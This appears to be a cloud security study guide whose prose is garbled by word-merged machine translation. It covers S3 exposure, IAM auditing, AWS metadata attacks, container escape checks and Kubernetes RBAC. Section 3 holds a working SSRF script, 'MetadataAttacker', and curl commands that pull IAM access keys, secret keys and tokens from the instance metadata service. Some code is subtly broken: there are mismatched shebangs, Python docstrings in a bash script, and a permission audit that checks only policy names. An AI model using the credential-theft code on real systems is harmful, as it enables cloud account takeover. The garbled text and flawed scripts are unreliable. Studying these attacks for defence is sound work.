# Cloud Security Complete Guide

## Learning Objectives
Master the core principles, attack techniques, and defense methods of cloud security

---

## 1. Cloud SecurityOverview

### 1.1 whatisCloud Security？
Cloud SecurityispointprotectcloudcalculateEnvironmentin Data、Applicationandbasic facility，including：
- identityandAccessmanagement（IAM）
- Dataencryption
- NetworkSecurity
- Configurationmanagement
- Compliance

### 1.2 maincloudserviceProvides商
1. **AWS (Amazon Web Services)**
2. **Azure (Microsoft Azure)**
3. **GCP (Google Cloud Platform)**
4. **阿insidecloud**
5. **腾讯cloud**

---

## 2. cloudConfigurationerrorAttack

### 2.1 S3 Bucket publicAccess

**Vulnerability**: AWS S3 storage bucketConfigurationaspublicAccess

**Detection Tools**:
```bash
#!/usr/bin/env python3
"""
AWS S3 Bucket 公开AccessDetection Tools
"""

import boto3
import requests
from botocore.exceptions import ClientError

class S3Scanner:
    def __init__(self):
        self.s3 = boto3.client('s3')
    
    def scan_public_buckets(self, bucket_names):
        """Scanning公开的 S3 存储桶"""
        public_buckets = []
        
        for bucket in bucket_names:
            try:
 # attemptnoauthenticationAccess
                url = f"https://{bucket}.s3.amazonaws.com/"
                r = requests.get(url, timeout=5)
                
                if r.status_code == 200:
                    public_buckets.append(bucket)
                    print(f"[+] 公开存储桶: {bucket}")
            
            except Exception as e:
                pass
        
        return public_buckets

# UseExample
scanner = S3Scanner()

# common storage bucketName
bucket_names = [
    "company-backup",
    "company-data",
    "company-files",
    "company-uploads",
]

public = scanner.scan_public_buckets(bucket_names)
```

---

### 2.2 IAM roleoverdegreepermission

**Vulnerability**: IAM rolehavehasovermultiplepermission

**Detection Scripts**:
```python
#!/usr/bin/env python3
"""
IAM 权限审计Tool
"""

import boto3
import json

class IMAuditor:
    def __init__(self):
        self.iam = boto3.client('iam')
    
    def audit_user_permissions(self, username):
        """审计User权限"""
        try:
 # obtainUserpolicy
            attached_policies = self.iam.list_attached_user_policies(
                UserName=username
            )
            
            inline_policies = self.iam.list_user_policies(
                UserName=username
            )
            
 # Analysispermission
            dangerous_permissions = [
                "s3:*",
                "ec2:*",
                "iam:*",
                "administratoraccess",
                "*:*",
            ]
            
            findings = []
            
            for policy in attached_policies['AttachedPolicies']:
 # obtainpolicydetails
                policy_doc = self.iam.get_policy(
                    PolicyArn=policy['PolicyArn']
                )
                
 # Checkdangerouspermission
                if any(danger in policy_doc['Policy']['PolicyName'].lower() 
                       for danger in dangerous_permissions):
                    findings.append({
                        'user': username,
                        'policy': policy['PolicyName'],
                        'risk': 'High'
                    })
                    print(f"[+] 危险策略: {policy['PolicyName']}")
            
            return findings
        
        except Exception as e:
            print(f"[-] 审计失败: {e}")
            return []

# UseExample
auditor = IMAuditor()
auditor.audit_user_permissions("developer-user")
```

---

## 3. cloud metadataDataAttack

### 3.1 AWS metaDataservice（IMDSv1 vs IMDSv2）

**Vulnerability**: Use IMDSv1 easyaffectedto SSRF Attack

**Attack Method**:
```bash
# IMDSv1（易affectedAttack）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2（Security）
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

**Detection Tools**:
```python
#!/usr/bin/env python3
"""
云元DataAttackDetection Tools
"""

import requests

class MetadataAttacker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_imdsv1(self):
        """Test IMDSv1 是否可Access"""
        metadata_url = "http://169.254.169.254/latest/meta-data/"
        
 # Through SSRF AccessmetaData
        ssrf_url = f"{self.target_url}?url={metadata_url}"
        
        try:
            r = self.session.get(ssrf_url, timeout=5)
            
            if r.status_code == 200 and "ami-id" in r.text:
                print("[+] IMDSv1 可Access，存在 SSRF 风险")
                return True
        
        except Exception as e:
            pass
        
        return False
    
    def extract_iam_credentials(self):
        """Extract IAM 临时凭证"""
 # obtainroleName
        role_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ssrf_url = f"{self.target_url}?url={role_url}"
        
        try:
            r = self.session.get(ssrf_url, timeout=5)
            
            if r.status_code == 200:
                role_name = r.text.strip()
                print(f"[+] IAM 角色: {role_name}")
                
 # obtaincredentials
                cred_url = f"{role_url}{role_name}"
                ssrf_url = f"{self.target_url}?url={cred_url}"
                
                r = self.session.get(ssrf_url, timeout=5)
                
                if r.status_code == 200:
                    import json
                    credentials = json.loads(r.text)
                    print(f"[+] Access Key: {credentials.get('AccessKeyId')}")
                    print(f"[+] Secret Key: {credentials.get('SecretAccessKey')}")
                    print(f"[+] Token: {credentials.get('Token')[:50]}...")
                    
                    return credentials
        
        except Exception as e:
            print(f"[-] Extract失败: {e}")
        
        return None

# UseExample
attacker = MetadataAttacker("http://target.com/fetch")
attacker.test_imdsv1()
attacker.extract_iam_credentials()
```

---

## 4. containerSecurity

### 4.1 Docker Container Escape

**Vulnerability**: containerConfigurationnotwhencauseescape

**Detection Scripts**:
```bash
#!/bin/bash
"""
Docker 容器SecurityDetection Scripts
"""

# Checkiswhetherincontainerin
if [ -f /.dockerenv ]; then
    echo "[+] 在 Docker 容器中"
    
 # Checkprivilegemode
    if capsh --print | grep -q "cap_sys_admin"; then
        echo "[!] 容器以特权模式运行"
    fi
    
 # Checkmount
    mount | grep "/host" && echo "[!] 主机FileSystem已挂载"
    
 # Check Docker Socket
    if [ -S /var/run/docker.sock ]; then
        echo "[!] Docker Socket 可Access"
    fi
fi
```

---

## 5. Kubernetes Security

### 5.1 RBAC Configurationerror

**Vulnerability**: overatlenient RBAC rule

**Detection Tools**:
```bash
#!/usr/bin/env python3
"""
Kubernetes RBAC 审计Tool
"""

from kubernetes import client, config

class K8sAuditor:
    def __init__(self):
        config.load_kube_config()
        self.rbac_api = client.RbacAuthorizationV1Api()
    
    def audit_rbac(self):
        """审计 RBAC Configuration"""
 # obtainall role
        roles = self.rbac_api.list_role_for_all_namespaces()
        
        dangerous_verbs = ["*", "create", "delete", "update", "patch"]
        dangerous_resources = ["*", "pods", "secrets", "configmaps"]
        
        for role in roles.items:
            for rule in role.rules:
 # Checkdangerouspermission
                if any(verb in dangerous_verbs for verb in rule.verbs):
                    if any(resource in dangerous_resources for resource in rule.resources):
                        print(f"[+] 危险角色: {role.metadata.name}")
                        print(f"    命名空间: {role.metadata.namespace}")
                        print(f"    资源: {rule.resources}")
                        print(f"    Operation: {rule.verbs}")

# UseExample
auditor = K8sAuditor()
auditor.audit_rbac()
```

---

## 6. Cloud SecurityBest Practices

### 6.1 least privilegeoriginalthen
```python
# Security IAM policyExample
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::my-bucket",
                "arn:aws:s3:::my-bucket/*"
            ]
        }
    ]
}
```

### 6.2 enablelogandmonitoring
```python
# enable CloudTrail
import boto3

client = boto3.client('cloudtrail')

# create Trail
response = client.create_trail(
    Name='security-trail',
    S3BucketName='security-logs-bucket',
    IncludeGlobalServiceEvents=True,
    IsMultiRegionTrail=True,
    EnableLogFileValidation=True
)

# enablelog
client.start_logging(Name='security-trail')
```

---

## 7. Learning Checklist

### Theory Mastery
- [x] understandCloud SecurityImportance
- [x] MastercloudConfigurationerror
- [x] MastermetaDataAttack
- [x] MastercontainerSecurity

### Practical Skills
- [x] S3 SecurityDetection
- [x] IAM permissionaudit
- [x] metaData Extraction
- [x] Container EscapeDetection

### Defense Capabilities
- [x] least privilegeConfiguration
- [x] log monitoring
- [x] encryptionConfiguration
- [x] Networkisolation

---

**Document Version**: 1.0
**Created**: 2026-03-26 19:21
**Learningwhen length**: estimated 5-6 Hours
**Learning Status**: 🟢 Complete
